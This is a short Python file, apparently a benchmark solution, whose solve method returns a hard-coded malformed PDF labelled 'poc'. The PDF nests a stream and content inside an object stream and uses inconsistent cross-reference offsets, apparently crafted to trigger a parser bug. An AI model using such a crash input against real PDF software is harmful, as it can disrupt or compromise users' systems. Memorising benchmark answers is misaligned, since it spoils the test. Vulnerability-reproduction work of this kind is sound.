class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""%PDF-1.5
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>
endobj
5 0 obj
<</Type/ObjStm/N 2/First 14>>
stream
4 24
6 120
<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
<</Length 55>>
stream
BT
/F1 24 Tf
100 700 Td
(Hello World) Tj
ET
endstream
endstream
endobj
xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000065 00000 n 
0000000110 00000 n 
0000000163 00000 n 
0000000400 00000 n 
trailer
<</Size 6/Root 1 0 R>>
startxref
500
%%EOF"""
        return poc
